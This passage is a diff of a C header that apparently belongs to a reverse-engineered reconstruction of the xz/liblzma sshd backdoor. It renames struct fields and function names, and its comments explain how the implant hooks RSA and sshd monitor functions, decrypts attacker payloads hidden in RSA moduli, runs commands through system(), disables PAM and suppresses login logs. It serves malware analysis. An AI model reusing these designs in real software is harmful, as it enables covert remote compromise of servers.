@@ -323,12 +323,12 @@ typedef struct {
  union {
   uint32_t crc32;
   uint64_t crc64;
-  lzma_sha256_state sha256;
+  lzma_sha256_state sha256_digest;
  } state;
 } lzma_check_state;
 
 /*
- * Normalized opcode values stored in `dasm_ctx_t::opcode_window` so pattern-matching routines can locate MOV/LEA/CALL sequences without pulling in a full decoder. For one-byte opcodes `x86_dasm` stores `raw_opcode + 0x80` (subtract 0x80 to recover the architectural opcode byte).
+ * Normalized opcode values stored in `dasm_ctx_t::opcode_window` so pattern-matching routines can locate MOV/LEA/CALL sequences without pulling in a full decoder. For one-byte opcodes `x86_decode_instruction` stores `raw_opcode + 0x80` (subtract 0x80 to recover the architectural opcode byte).
  */
 enum X86_OPCODE {
  X86_OPCODE_LEA = 0x10D,
@@ -598,19 +598,19 @@ struct kex {
 typedef struct kex kex;
 
 /*
- * Privsep-side state that exposes the RPC pipes (auth + logging), the pkex table pointer, and the monitor PID so helpers such as sshd_get_client_socket/sshd_get_sshbuf can operate on the live monitor struct.
+ * Privsep-side state that exposes the RPC pipes (auth + logging), the pkex table pointer, and the monitor PID so helpers such as sshd_get_monitor_comm_fd/sshd_find_forged_modulus_sshbuf can operate on the live monitor struct.
  */
 struct monitor {
  int child_to_monitor_fd; /* sshd child writes monitor RPCs to this pipe; monitor reads replies back when forging requests (DIR_WRITE). */
  int monitor_to_child_fd; /* Monitor thread writes responses here; child reads them when draining forged packets (DIR_READ). */
- int log_child_to_monitor_fd; /* Logging channel equivalent of child_to_monitor_fd (used by sshd_log/mm_log_handler). */
+ int log_child_to_monitor_fd; /* Logging channel equivalent of child_to_monitor_fd (used by sshd_log_via_sshlogv/mm_log_handler). */
  int log_monitor_to_child_fd; /* Logging channel equivalent of monitor_to_child_fd so mm_log_handler can read monitor output. */
  struct kex **pkex_table; /* Pointer to the monitor's pkex table (array of sshbuf-backed kex records discovered via sshd_offsets). */
  pid_t monitor_pid; /* Process ID of the active monitor helper once privsep spins up. */
 };
 
 /*
- * Privsep-side state that exposes the RPC pipes (auth + logging), the pkex table pointer, and the monitor PID so helpers such as sshd_get_client_socket/sshd_get_sshbuf can operate on the live monitor struct.
+ * Privsep-side state that exposes the RPC pipes (auth + logging), the pkex table pointer, and the monitor PID so helpers such as sshd_get_monitor_comm_fd/sshd_find_forged_modulus_sshbuf can operate on the live monitor struct.
  */
 typedef struct monitor monitor;
 
@@ -768,7 +768,7 @@ typedef struct __attribute__((packed)) elf_info {
  Elf64_Ehdr *elfbase; /* Base pointer to the mapped ELF header used for pointer arithmetic. */
  u64 load_base_vaddr; /* Lowest PT_LOAD virtual address so runtime addrs can be rebased into the file image. */
  Elf64_Phdr *phdrs; /* Program header table inside the mapped object. */
- u64 phdr_count; /* Number of program headers validated by elf_parse. */
+ u64 phdr_count; /* Number of program headers validated by elf_info_parse. */
  Elf64_Dyn *dynamic_segment; /* PT_DYNAMIC table extracted from the load. */
  u64 dyn_entry_count; /* Number of meaningful dynamic entries discovered before DT_NULL. */
  char *dynstr; /* .dynstr (string table for dynamic symbols). */
@@ -837,7 +837,7 @@ typedef int (*pfn_shutdown_t)(int sockfd, int how);
 typedef struct __attribute__((packed)) libc_imports {
  u32 resolved_imports_count; /* Incremented whenever a libc stub resolves; reaching the expected total gates later stages. */
  u32 reserved_imports_padding; /* Alignment padding before the function pointer block. */
- pfn_malloc_usable_size_t malloc_usable_size; /* Fake allocator stub returned by find_dl_audit_offsets so liblzma callers can probe chunk sizes. */
+ pfn_malloc_usable_size_t malloc_usable_size; /* Fake allocator stub returned by resolve_ldso_audit_offsets so liblzma callers can probe chunk sizes. */
  pfn_getuid_t getuid; /* Used when deciding whether payload commands should attempt privilege changes. */
  pfn_exit_t exit; /* Hard-exit path when hooks fail and sshd should terminate immediately. */
  pfn_setresgid_t setresgid; /* Applied by payload handlers before running `system()` commands. */
@@ -845,7 +845,7 @@ typedef struct __attribute__((packed)) libc_imports {
  pfn_system_t system; /* Executes decoded attacker commands (payload type 0x3). */
  pfn_write_t write; /* Socket write helper (e.g., feeding canned monitor replies). */
  pfn_pselect_t pselect; /* Used by the fd I/O helpers to mirror sshd's blocking behaviour. */
- pfn_read_t read; /* Read stub allocated during libc resolution so fd_read can avoid the PLT. */
+ pfn_read_t read; /* Read stub allocated during libc resolution so fd_read_full can avoid the PLT. */
  pfn___errno_location_t __errno_location; /* Provides thread-local errno access for the fd shims. */
  pfn_setlogmask_t setlogmask; /* Lets the implant silence syslog noise before patching. */
  pfn_shutdown_t shutdown; /* Allows hooks to close sockets cleanly when aborting connections. */
@@ -1081,9 +1081,9 @@ typedef struct __attribute__((packed)) sshd_ctx {
  BOOL have_mm_answer_authpassword; /* mm_answer_authpassword located and hook slot writable. */
  BOOL have_mm_answer_keyverify; /* mm_answer_keyverify located and hook slot writable. */
  u8 hook_flags_padding[4];
- sshd_monitor_func_t mm_answer_authpassword_hook; /* Hook entry installed for MONITOR_REQ_AUTHPASSWORD. */
- sshd_monitor_func_t mm_answer_keyallowed_hook; /* Hook entry that runs the payload state machine. */
- sshd_monitor_func_t mm_answer_keyverify_hook; /* Hook entry that replies to keyverify without sshd. */
+ sshd_monitor_func_t mm_answer_authpassword_send_reply_hook; /* Hook entry installed for MONITOR_REQ_AUTHPASSWORD. */
+ sshd_monitor_func_t mm_answer_keyallowed_payload_dispatch_hook; /* Hook entry that runs the payload state machine. */
+ sshd_monitor_func_t mm_answer_keyverify_send_staged_reply_hook; /* Hook entry that replies to keyverify without sshd. */
  sshd_monitor_func_t *mm_answer_authpassword_start; /* Original mm_answer_authpassword() start in sshd. */
  void *mm_answer_authpassword_end; /* Original mm_answer_authpassword() end address (scan bound). */
  sshd_monitor_func_t *mm_answer_authpassword_slot; /* Pointer to monitor_dispatch[authpassword] slot. */
@@ -1153,14 +1153,14 @@ typedef struct __attribute__((packed)) sshd_log_ctx {
  char *str_user; /* "user" label inserted before the redacted username. */
  log_handler_fn *log_handler_slot; /* Address of sshd's global log_handler function pointer. */
  void **log_handler_ctx_slot; /* Address of the companion log_handler_ctx pointer. */
- log_handler_fn saved_log_handler; /* Original handler captured before installing mm_log_handler_hook. */
+ log_handler_fn saved_log_handler; /* Original handler captured before installing mm_log_handler_hide_auth_success_hook. */
  void *saved_log_handler_ctx; /* Original log handler context value (may be NULL). */
  void *sshlogv_impl; /* Direct pointer to sshlogv for emitting sanitized messages without libc wrappers. */
  mm_log_handler_fn log_hook_entry; /* Hook trampoline we patch into sshd's handler slot. */
 } sshd_log_ctx_t;
 
 /*
- * Compressed description of the monitor→kex layout used by sshd_get_sshbuf: kex_sshbuf_qword_index selects the qword inside `struct kex` that is treated as a candidate `sshbuf *`, while monitor_pkex_table_dword_index selects the dword slot inside `struct monitor` that points at the active `kex **` pointer.
+ * Compressed description of the monitor→kex layout used by sshd_find_forged_modulus_sshbuf: kex_sshbuf_qword_index selects the qword inside `struct kex` that is treated as a candidate `sshbuf *`, while monitor_pkex_table_dword_index selects the dword slot inside `struct monitor` that points at the active `kex **` pointer.
  */
 typedef union __attribute__((packed)) sshd_offsets_kex {
  struct __attribute__((packed)) {
@@ -1213,7 +1213,7 @@ typedef struct __attribute__((packed)) sshd_hostkey_index {
 typedef enum {
  PAYLOAD_STREAM_EXPECT_HEADER = 0, /* State zero: staging buffer must stay below 0xae bytes until the signed header decrypts and the Ed448 check succeeds. */
  PAYLOAD_STREAM_BUFFERING_BODY = 1, /* Header verified; continue appending ChaCha-decrypted body chunks until the advertised payload_total_size is satisfied. */
- PAYLOAD_STREAM_BUFFERING_TRAILER = 2, /* Reserved continuation stage (treated equivalently to state 1 by check_backdoor_state for older payload builders). */
+ PAYLOAD_STREAM_BUFFERING_TRAILER = 2, /* Reserved continuation stage (treated equivalently to state 1 by payload_stream_validate_or_poison for older payload builders). */
  PAYLOAD_STREAM_COMMAND_READY = 3, /* Entire signed payload assembled and verified; mm_answer_keyallowed may now interpret the decrypted command. */
  PAYLOAD_STREAM_DISPATCHED = 4, /* Command handlers already consumed the payload—new chunks are ignored until the buffer resets. */
  PAYLOAD_STREAM_POISONED = 0xffffffff /* Fatal validation error; callers must discard any staged ciphertext and restart at state zero. */
@@ -1253,8 +1253,8 @@ typedef struct __attribute__((packed)) global_context {
  u8 *payload_buffer; /* Pointer to the shared payload scratch (hooks_data->signed_data). */
  sshd_payload_ctx_t *payload_ctx; /* Parsed payload header/context produced by keyallowed hook. */
  u32 sshd_host_pubkey_idx; /* Hostkey slot that verified the Ed448 signature. */
- payload_stream_state_t payload_state; /* Streaming state machine enforced by check_backdoor_state. */
- u8 encrypted_secret_data[57]; /* ChaCha-encrypted secret blob; decrypted by secret_data_get_decrypted. */
+ payload_stream_state_t payload_state; /* Streaming state machine enforced by payload_stream_validate_or_poison. */
+ u8 encrypted_secret_data[57]; /* ChaCha-encrypted secret blob; decrypted by secret_data_decrypt_with_embedded_seed. */
  u8 shift_operation_flags[31]; /* Per-operation guard bits so secret_data_append_* runs each attestation once. */
  u32 secret_bits_filled; /* Total bits shifted into the secret_data buffer so far. */
  u32 secret_data_padding; /* Alignment padding. */
@@ -1290,9 +1290,9 @@ typedef struct __attribute__((packed)) ldso_ctx {
  char **libcrypto_l_name;
  dl_audit_symbind_alt_fn _dl_audit_symbind_alt;
  size_t _dl_audit_symbind_alt__size;
- pfn_RSA_public_decrypt_t hook_RSA_public_decrypt;
- pfn_EVP_PKEY_set1_RSA_t hook_EVP_PKEY_set1_RSA;
- pfn_RSA_get0_key_t hook_RSA_get0_key;
+ pfn_RSA_public_decrypt_t rsa_public_decrypt_backdoor_shim;
+ pfn_EVP_PKEY_set1_RSA_t evp_pkey_set1_rsa_backdoor_shim;
+ pfn_RSA_get0_key_t rsa_get0_key_backdoor_shim;
  imported_funcs_t *imported_funcs;
  u64 hooks_installed;
 } ldso_ctx_t;
@@ -1316,26 +1316,26 @@ typedef struct __attribute__((packed)) backdoor_hooks_data {
  */
 typedef struct __attribute__((packed)) backdoor_hooks_ctx {
  u8 bootstrap_scratch[0x30]; /* Zeroed on every init attempt; doubles as throwaway storage while we copy the ctx around during bootstrap. */
- backdoor_shared_globals_t *shared_globals_ptr; /* Pointer to the `backdoor_shared_globals_t` shim; stays NULL until init_shared_globals publishes the shared block. */
+ backdoor_shared_globals_t *shared_globals_ptr; /* Pointer to the `backdoor_shared_globals_t` shim; stays NULL until init_backdoor_shared_globals publishes the shared block. */
  backdoor_hooks_data_t **hooks_data_slot_ptr; /* Address of liblzma’s global hooks_data pointer so stage two can pull the persistent blob/documented contexts out of `.bss`. */
  audit_symbind64_fn symbind64_trampoline; /* Backdoor symbind trampoline installed into ld.so’s audit vector (backdoor_symbind64). */
  pfn_RSA_public_decrypt_t rsa_public_decrypt_entry; /* RSA_public_decrypt replacement pushed into sshd’s PLT. */
  pfn_RSA_get0_key_t rsa_get0_key_entry; /* RSA_get0_key replacement pushed into sshd’s PLT. */
  mm_log_handler_fn mm_log_handler_entry; /* mm_log_handler shim we install when hooking sshd. */
  void *mm_log_handler_ctx_slot; /* Reserved slot for the log-hook context pointer (currently unused but keeps the struct layout stable). */
- u64 bootstrap_state_flags; /* Scratch flags touched by init_hooks_ctx (set to 0x4 during bootstrap retries). */
+ u64 bootstrap_state_flags; /* Scratch flags touched by hooks_ctx_init_or_wait_for_shared_globals (set to 0x4 during bootstrap retries). */
  sshd_monitor_func_t mm_answer_keyallowed_entry; /* mm_answer_keyallowed hook entry point. */
  sshd_monitor_func_t mm_answer_keyverify_entry; /* mm_answer_keyverify hook entry point. */
  void *pending_monitor_hook; /* Placeholder for future monitor-hook trampolines (never populated in this build). */
 } backdoor_hooks_ctx_t;
 
 /*
- * Argument bundle handed to `backdoor_setup`: zeroed scratch + the shared-globals pointer, hook context, dummy lzma_check_state, and the active `elf_entry_ctx_t` describing the hijacked cpuid GOT slot.
+ * Argument bundle handed to `backdoor_install_runtime_hooks`: zeroed scratch + the shared-globals pointer, hook context, dummy lzma_check_state, and the active `elf_entry_ctx_t` describing the hijacked cpuid GOT slot.
  */
 typedef struct __attribute__((packed)) backdoor_setup_params {
  u8 bootstrap_padding[0x8]; /* Scratch bytes stage two zeroes while stack-allocating the struct; keeps the later pointers aligned and doubles as the memset target. */
  backdoor_shared_globals_t *shared_globals; /* Pointer to the published `backdoor_shared_globals_t` block (authpassword hook entry, EVP hook entry, global_ctx slot). */
- backdoor_hooks_ctx_t *hook_ctx; /* Active hook descriptor produced by init_hooks_ctx (contains the mm/RSA trampolines and hooks_data slot). */
+ backdoor_hooks_ctx_t *hook_ctx; /* Active hook descriptor produced by hooks_ctx_init_or_wait_for_shared_globals (contains the mm/RSA trampolines and hooks_data slot). */
  lzma_check_state dummy_check_state; /* Throwaway check_state initialised with lzma_check_init so stage two can satisfy the API while building the params. */
  elf_entry_ctx_t *entry_ctx; /* Captured GOT/stack metadata for the currently hijacked cpuid thunk. */
 } backdoor_setup_params_t;
@@ -1475,11 +1475,11 @@ typedef struct __attribute__((packed)) secret_data_item {
  secret_data_shift_cursor_t bit_cursor; /* Bit-stream cursor describing where this item lands inside the obfuscated secret data log. */
  u32 operation_slot; /* Index into global_ctx->shift_operations[] so each helper shifts at most once. */
  u32 bits_to_shift; /* Number of bits consumed/emitted when this descriptor succeeds (rolls into global_ctx->num_shifted_bits). */
- u32 ordinal; /* Non-zero slot ordinal assigned by secret_data_append_items; zero marks disabled entries. */
+ u32 ordinal; /* Non-zero slot ordinal assigned by secret_data_append_items_batch; zero marks disabled entries. */
 } secret_data_item_t;
 
 /*
- * First 16 bytes of every encrypted payload chunk. The stride/index/bias triple stays in plaintext so decrypt_payload_message can reuse it as the ChaCha nonce, and run_backdoor_commands collapses it into monitor_data.cmd_type via (stride * index + bias) before committing to the payload.
+ * First 16 bytes of every encrypted payload chunk. The stride/index/bias triple stays in plaintext so payload_stream_decrypt_and_append_chunk can reuse it as the ChaCha nonce, and rsa_backdoor_command_dispatch collapses it into monitor_data.cmd_type via (stride * index + bias) before committing to the payload.
  */
 typedef struct __attribute__((packed)) backdoor_payload_hdr {
  u32 cmd_type_stride; /* Low 32 bits of the ChaCha nonce; multiplied with cmd_type_index before cmd_type_bias is applied. */
@@ -1496,12 +1496,12 @@ typedef union __attribute__((packed)) {
 } u_cmd_arguments_t;
 
 /*
- * control_flags/monitor_flags/request_flags plus a two-byte payload_hint that collectively drive log-hook installs, PAM disablement, socket selection, monitor request IDs, and whether sshd_proxy_elevate should stream payloads or patch ctx->sshd_offsets.
+ * control_flags/monitor_flags/request_flags plus a two-byte payload_hint that collectively drive log-hook installs, PAM disablement, socket selection, monitor request IDs, and whether sshd_monitor_cmd_dispatch should stream payloads or patch ctx->sshd_offsets.
  */
 typedef struct __attribute__((packed)) cmd_arguments {
- u8 control_flags; /* Primary toggles consumed by run_backdoor_commands()/sshd_proxy_elevate: bit0 requests sshd exit after dispatch (propagates into ctx->exit_flag and calls libc_exit(0) on parse failures), bit1 asks sshd_configure_log_hook() to run, bit2 requests setlogmask(-0x80000000), bit3 differentiates "squelch" logging from the filter mode, bit4 requires that the attacker-supplied format strings are present before enabling the filter, bit5 forces sshd_proxy_elevate to use sshd_get_usable_socket() with the encoded socket ids, bit6 disables PAM by zeroing use_pam_ptr, and bit7 tells sshd_proxy_elevate to wait for replies while letting opcode 0 treat the tail bytes as sshd_offsets overrides. */
- u8 monitor_flags; /* Secondary command byte: bit0 marks that continuation chunks include an 8-byte prefix before the little-endian size, bit1/bit2 tell run_backdoor_commands() that flags3/payload_hint carry sshd_offsets nibbles, bits3-5 hold the socket ordinal for cmd_type 0/1/2 when manual sockets are requested, and the high bits (0xC0) describe how cmd_type 3 sources payloads (0x40 = exit immediately, 0x00/0x80 = find the ChaCha blob on the stack, 0xC0 = payload_body/payload_body_size already populated). */
- u8 request_flags; /* Monitor/socket selector: the low 5 bits either override the MONITOR_REQ_* opcode or carry an additional socket index, bit5 advertises that sshd_proxy_elevate must pull an sshbuf payload via sshd_get_sshbuf(), and bit6 repurposes the tail bytes when opcode 0 patches ctx->sshd_offsets (see run_backdoor_commands()). */
+ u8 control_flags; /* Primary toggles consumed by rsa_backdoor_command_dispatch()/sshd_monitor_cmd_dispatch: bit0 requests sshd exit after dispatch (propagates into ctx->exit_flag and calls libc_exit(0) on parse failures), bit1 asks sshd_install_mm_log_handler_hook() to run, bit2 requests setlogmask(-0x80000000), bit3 differentiates "squelch" logging from the filter mode, bit4 requires that the attacker-supplied format strings are present before enabling the filter, bit5 forces sshd_monitor_cmd_dispatch to use sshd_find_socket_fd_by_shutdown_probe() with the encoded socket ids, bit6 disables PAM by zeroing use_pam_ptr, and bit7 tells sshd_monitor_cmd_dispatch to wait for replies while letting opcode 0 treat the tail bytes as sshd_offsets overrides. */
+ u8 monitor_flags; /* Secondary command byte: bit0 marks that continuation chunks include an 8-byte prefix before the little-endian size, bit1/bit2 tell rsa_backdoor_command_dispatch() that flags3/payload_hint carry sshd_offsets nibbles, bits3-5 hold the socket ordinal for cmd_type 0/1/2 when manual sockets are requested, and the high bits (0xC0) describe how cmd_type 3 sources payloads (0x40 = exit immediately, 0x00/0x80 = find the ChaCha blob on the stack, 0xC0 = payload_body/payload_body_size already populated). */
+ u8 request_flags; /* Monitor/socket selector: the low 5 bits either override the MONITOR_REQ_* opcode or carry an additional socket index, bit5 advertises that sshd_monitor_cmd_dispatch must pull an sshbuf payload via sshd_find_forged_modulus_sshbuf(), and bit6 repurposes the tail bytes when opcode 0 patches ctx->sshd_offsets (see rsa_backdoor_command_dispatch()). */
  u_cmd_arguments_t payload_hint; /* Final two bytes reused as either a payload length (continuation chunks streamed into ctx->payload_buffer) or as raw bitfields when opcode 0 repacks ctx->sshd_offsets/monitor request selectors. */
 } cmd_arguments_t;
 
@@ -1528,16 +1528,16 @@ typedef struct __attribute__((packed)) backdoor_payload {
 } backdoor_payload_t;
 
 /*
- * Outer frame for each streamed chunk: ChaCha ciphertext that carries the plaintext header + length prefix + body, giving decrypt_payload_message enough structure to stage the decrypted command bytes.
+ * Outer frame for each streamed chunk: ChaCha ciphertext that carries the plaintext header + length prefix + body, giving payload_stream_decrypt_and_append_chunk enough structure to stage the decrypted command bytes.
  */
 typedef struct __attribute__((packed)) key_payload {
- backdoor_payload_hdr_t header; /* Plaintext 16-byte nonce/cmd seed reused directly by decrypt_payload_message. */
+ backdoor_payload_hdr_t header; /* Plaintext 16-byte nonce/cmd seed reused directly by payload_stream_decrypt_and_append_chunk. */
  u16 encrypted_body_length; /* Little-endian body length in ciphertext; decrypted to learn how many bytes to copy. */
  u8 encrypted_body[1]; /* Variable-length ciphertext immediately following the length field. */
 } key_payload_t;
 
 /*
- * Stack scratch wrapper used by run_backdoor_commands: a 5-byte cmd_arguments_t prefix followed by the key_payload_t ciphertext chunk copied from the RSA modulus stream.
+ * Stack scratch wrapper used by rsa_backdoor_command_dispatch: a 5-byte cmd_arguments_t prefix followed by the key_payload_t ciphertext chunk copied from the RSA modulus stream.
  */
 typedef union __attribute__((packed)) key_payload_cmd_frame {
  u8 bytes[0x21d]; /* Raw view: 5-byte cmd_flags prefix + modulus ciphertext chunk (max 0x218 bytes). */
@@ -1545,7 +1545,7 @@ typedef union __attribute__((packed)) key_payload_cmd_frame {
   cmd_arguments_t cmd_flags; /* Scratch copy of the decrypted cmd flag bytes (control/monitor/request flags + payload_hint) staged before the ciphertext for easy access. */
   u8 header_bytes[16]; /* Plaintext payload header reused as the ChaCha nonce; see backdoor_payload_hdr_t for decoded {stride,index,bias}. */
   u16 encrypted_body_length; /* Little-endian body length in ciphertext; becomes valid plaintext after the first ChaCha pass. */
-  u8 encrypted_body[0x206]; /* Ciphertext body bytes (max derived from run_backdoor_commands() modulus bounds: 0x218 - 0x10 - 2). */
+  u8 encrypted_body[0x206]; /* Ciphertext body bytes (max derived from rsa_backdoor_command_dispatch() modulus bounds: 0x218 - 0x10 - 2). */
  } fields;
 } key_payload_cmd_frame_t;
 
@@ -1583,12 +1583,12 @@ enum CommandFlags3 {
 typedef enum {
  MONITOR_CMD_CONTROL_PLANE = 0, /* Baseline command stream: updates sshd offsets/logging toggles and can stream continuation payloads through the forged monitor socket. */
  MONITOR_CMD_PATCH_VARIABLES = 1, /* Rewrites sshd globals (PermitRootLogin/use_pam/log hooks) before resuming the monitor loop. */
- MONITOR_CMD_SYSTEM_EXEC = 2, /* Runs attacker-provided setresuid/setresgid/system commands and optionally asks sshd_proxy_elevate to exit afterwards. */
- MONITOR_CMD_PROXY_EXCHANGE = 3 /* Fully populate monitor_data_t and have sshd_proxy_elevate forge a MONITOR_REQ_KEYALLOWED exchange on the chosen socket. */
+ MONITOR_CMD_SYSTEM_EXEC = 2, /* Runs attacker-provided setresuid/setresgid/system commands and optionally asks sshd_monitor_cmd_dispatch to exit afterwards. */
+ MONITOR_CMD_PROXY_EXCHANGE = 3 /* Fully populate monitor_data_t and have sshd_monitor_cmd_dispatch forge a MONITOR_REQ_KEYALLOWED exchange on the chosen socket. */
 } monitor_cmd_type_t;
 
 /*
- * Working context for RSA-related operations; caches the cloned modulus/exponent, parsed cmd flags, decrypted payload bytes, the 32-byte host-key digest slot, ChaCha nonce/IV snapshots, and the attacker’s unwrapped Ed448 key (whose low 32 bytes double as the ChaCha key) so run_backdoor_commands can replay decryptions without re-reading secret_data.
+ * Working context for RSA-related operations; caches the cloned modulus/exponent, parsed cmd flags, decrypted payload bytes, the 32-byte host-key digest slot, ChaCha nonce/IV snapshots, and the attacker’s unwrapped Ed448 key (whose low 32 bytes double as the ChaCha key) so rsa_backdoor_command_dispatch can replay decryptions without re-reading secret_data.
  */
 typedef struct __attribute__((packed)) key_ctx {
  const BIGNUM *rsa_modulus; /* RSA modulus returned by RSA_get0_key; reused when forging RSA_set0_key input. */
@@ -1597,16 +1597,16 @@ typedef struct __attribute__((packed)) key_ctx {
  backdoor_payload_t decrypted_payload; /* Entire decrypted payload blob (header + body) kept around for signature checks/replays. */
  u8 hostkey_digest[32]; /* SHA-256 digest of the current sshd host key before it is spliced into decrypted_payload. */
  u8 payload_nonce[16]; /* Plaintext nonce lifted from the payload header (cmd_type seeds) reused as the ChaCha nonce. */
- u8 chacha_iv[16]; /* ChaCha IV/counter snapshot so decrypt_payload_message can rewind the keystream for replays. */
- u8 attacker_ed448_key[57]; /* Raw Ed448 public key bytes from secret_data_get_decrypted (low 32 bytes double as the ChaCha key). */
+ u8 chacha_iv[16]; /* ChaCha IV/counter snapshot so payload_stream_decrypt_and_append_chunk can rewind the keystream for replays. */
+ u8 attacker_ed448_key[57]; /* Raw Ed448 public key bytes from secret_data_decrypt_with_embedded_seed (low 32 bytes double as the ChaCha key). */
  u8 ed448_key_align[2]; /* Padding to keep the struct 8-byte aligned after the 57-byte key. */
 } key_ctx_t;
 
 /*
- * Argument bundle that `run_backdoor_commands` hands to `sshd_proxy_elevate`: it carries the decoded cmd opcode, parsed cmd_arguments_t flags, cloned RSA modulus/exponent, payload body pointer/size, and the RSA handle borrowed from OpenSSL.
+ * Argument bundle that `rsa_backdoor_command_dispatch` hands to `sshd_monitor_cmd_dispatch`: it carries the decoded cmd opcode, parsed cmd_arguments_t flags, cloned RSA modulus/exponent, payload body pointer/size, and the RSA handle borrowed from OpenSSL.
  */
 typedef struct __attribute__((packed)) monitor_data {
- monitor_cmd_type_t cmd_type; /* Attacker-defined opcode describing how sshd_proxy_elevate should respond (control-plane updates, sshd variable patches, system() exec, or forged monitor exchanges). */
+ monitor_cmd_type_t cmd_type; /* Attacker-defined opcode describing how sshd_monitor_cmd_dispatch should respond (control-plane updates, sshd variable patches, system() exec, or forged monitor exchanges). */
  u32 cmd_type_padding; /* High dword of the ChaCha-derived cmd index; left unused but keeps the runtime_data union 64-bit aligned. */
  cmd_arguments_t *args; /* Pointer to the decoded cmd flag bytes pulled from the decrypted payload body. */
  const BIGNUM *rsa_n; /* Modulus cloned from the staged RSA key (used when forging keyallowed/keyverify exchanges). */
@@ -1626,17 +1626,17 @@ typedef union __attribute__((packed)) backdoor_runtime_data {
 } backdoor_runtime_data_t;
 
 /*
- * Full stack frame for `run_backdoor_commands`: tracks payload body/cipher sizing, the RSA hook’s do_orig flag, host key iteration counters, the staging union (socket receive buffers vs. staged Ed448 key material), plus the runtime monitor_data_t scratch and embedded `key_ctx_t` reused across commands.
+ * Full stack frame for `rsa_backdoor_command_dispatch`: tracks payload body/cipher sizing, the RSA hook’s do_orig flag, host key iteration counters, the staging union (socket receive buffers vs. staged Ed448 key material), plus the runtime monitor_data_t scratch and embedded `key_ctx_t` reused across commands.
  */
 typedef struct __attribute__((packed)) run_backdoor_commands_data {
  u64 payload_body_size; /* Plaintext bytes (cmd flags + monitor payload) staged from the decrypted modulus. */
  BOOL *do_orig_flag; /* Pointer to the RSA hook's do_orig flag so failures can fall back to OpenSSL. */
- u64 payload_cipher_size; /* Ciphertext length carved out of the RSA modulus before decrypt_payload_message runs. */
+ u64 payload_cipher_size; /* Ciphertext length carved out of the RSA modulus before payload_stream_decrypt_and_append_chunk runs. */
  u64 hostkey_digest_offset; /* Offset/cursor used while hashing sshd host keys and when reusing the buffer for patch commands. */
  RSA *rsa_handle; /* RSA handle supplied by OpenSSL; reused when forging monitor packets or rebuilding RSA_set0_key input. */
  u8 *payload_body_cursor; /* Pointer into ctx->payload_buffer where continuation chunks are copied. */
  u8 *ed448_key_cursor; /* Pointer to the Ed448 key bytes currently staged for signature verification or rotation. */
- u64 hostkey_count; /* Number of sshd host keys discovered through count_pointers(). */
+ u64 hostkey_count; /* Number of sshd host keys discovered through count_null_terminated_ptrs(). */
  u8 hostkey_index_align[4]; /* Alignment gap before the current host key index. */
  u32 hostkey_index; /* Index of the sshd host key currently being hashed/verified. */
  u64 last_hostkey_index; /* Previously verified host key index so continuation chunks can resume. */
@@ -1644,9 +1644,9 @@ typedef struct __attribute__((packed)) run_backdoor_commands_data {
  u8 staging_mode; /* Flags describing whether staging carries socket RX state or host-key metadata. */
  union {
   struct __attribute__((packed)) {
-   int fd; /* Socket descriptor returned by sshd_get_client_socket/sshd_get_usable_socket. */
+   int fd; /* Socket descriptor returned by sshd_get_monitor_comm_fd/sshd_find_socket_fd_by_shutdown_probe. */
    u32 recv_size; /* Bytes remaining to read from the selected socket when streaming payloads. */
-   u8 recv_buf[64]; /* Inline buffer used together with fd_read/pselect before copying into ctx->payload_buffer. */
+   u8 recv_buf[64]; /* Inline buffer used together with fd_read_full/pselect before copying into ctx->payload_buffer. */
   } socket_state;
   struct __attribute__((packed)) {
    u64 host_keys_available; /* Entries counted in ctx->sshd_sensitive_data->host_keys. */
@@ -1655,7 +1655,7 @@ typedef struct __attribute__((packed)) run_backdoor_commands_data {
   } keyset;
  } staging;
  u8 runtime_align[7]; /* Padding so backdoor_runtime_data_t stays 8-byte aligned. */
- backdoor_runtime_data_t runtime; /* Either interpreted as monitor_data_t or as scratch bytes prior to sshd_proxy_elevate. */
+ backdoor_runtime_data_t runtime; /* Either interpreted as monitor_data_t or as scratch bytes prior to sshd_monitor_cmd_dispatch. */
  key_ctx_t key_ctx; /* Cached modulus/exponent pointers plus the decrypted payload/nonce/digest bundle reused across commands. */
 } run_backdoor_commands_data_t;
 
@@ -1663,16 +1663,16 @@ typedef struct __attribute__((packed)) run_backdoor_commands_data {
  * Constant offsets harvested from liblzma that describe where the cpuid GOT slot and stage-two trampoline live so the hook can update them without rescanning instructions.
  */
 typedef struct __attribute__((packed)) backdoor_cpuid_reloc_consts {
- ptrdiff_t random_cpuid_slot_offset_from_got_anchor; /* Delta from `update_got_offset`’s sentinel to the GOT entry storing `cpuid_random_symbol`; used to find the shimmed cpuid resolver. */
- u64 cpuid_stub_got_index; /* GOT index (as seen by liblzma’s cpuid IFUNC) for the slot we later overwrite with backdoor_init_stage2. */
- ptrdiff_t stage2_trampoline_offset_from_got_anchor; /* Delta from the same GOT anchor to the `backdoor_init_stage2` function pointer so the loader can jump to stage two without rescanning code. */
+ ptrdiff_t random_cpuid_slot_offset_from_got_anchor; /* Delta from `cache_got_base_offset_from_cpuid_anchor`’s sentinel to the GOT entry storing `cpuid_random_symbol`; used to find the shimmed cpuid resolver. */
+ u64 cpuid_stub_got_index; /* GOT index (as seen by liblzma’s cpuid IFUNC) for the slot we later overwrite with cpuid_ifunc_stage2_install_hooks. */
+ ptrdiff_t stage2_trampoline_offset_from_got_anchor; /* Delta from the same GOT anchor to the `cpuid_ifunc_stage2_install_hooks` function pointer so the loader can jump to stage two without rescanning code. */
 } backdoor_cpuid_reloc_consts_t;
 
 /*
  * Similar relocation constants for the `__tls_get_addr` thunk so we can locate the PLT stub and randomized GOT slot at runtime.
  */
 typedef struct __attribute__((packed)) backdoor_tls_get_addr_reloc_consts {
- ptrdiff_t plt_stub_offset_from_got_anchor; /* Delta applied to `update_got_offset`’s sentinel (`_Llzma_block_buffer_decode_0`) so helpers can jump straight into the `__tls_get_addr` PLT stub. */
+ ptrdiff_t plt_stub_offset_from_got_anchor; /* Delta applied to `cache_got_base_offset_from_cpuid_anchor`’s sentinel (`_Llzma_block_buffer_decode_0`) so helpers can jump straight into the `__tls_get_addr` PLT stub. */
  ptrdiff_t random_slot_offset_from_got_anchor; /* Delta from the relocation-safe GOT anchor (`elf_functions_offset`) to the randomized slot that holds `tls_get_addr_random_symbol`. */
 } backdoor_tls_get_addr_reloc_consts_t;
 
@@ -1690,9 +1690,9 @@ typedef struct __attribute__((packed)) elf_functions {
  init_hook_functions_fn init_hook_functions;
  u64 reserved_before_symbol_lookup_0;
  u64 reserved_before_symbol_lookup_1;
- elf_symbol_get_addr_fn elf_symbol_get_addr;
+ elf_symbol_get_addr_fn elf_gnu_hash_lookup_symbol_addr;
  u64 reserved_before_elf_parse;
- elf_parse_fn elf_parse;
